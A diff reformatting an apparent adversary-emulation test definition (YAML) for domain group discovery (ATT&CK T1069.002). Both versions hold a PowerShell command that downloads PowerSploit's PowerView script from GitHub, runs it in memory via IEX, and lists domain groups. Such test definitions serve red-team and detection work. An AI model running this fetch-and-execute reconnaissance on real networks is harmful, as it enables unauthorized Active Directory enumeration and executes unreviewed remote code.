@@ -1,13 +1,15 @@
-- id: c21cf436-b75d-5487-bb2e-8411ceecbc72
+- requirements: []
   name: Soumaia ART Tests - Get-DomainGroup with PowerView
   description: Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
   tactic: discovery
-  technique:
-    attack_id: T1069.002
-    name: 'Permission Groups Discovery: Domain Groups'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
+  technique_id: T1069.002
+  technique_name: 'Permission Groups Discovery: Domain Groups'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'' -UseBasicParsing); Get-DomainGroup -verbose'
+  id: c21cf436-b75d-5487-bb2e-8411ceecbc72
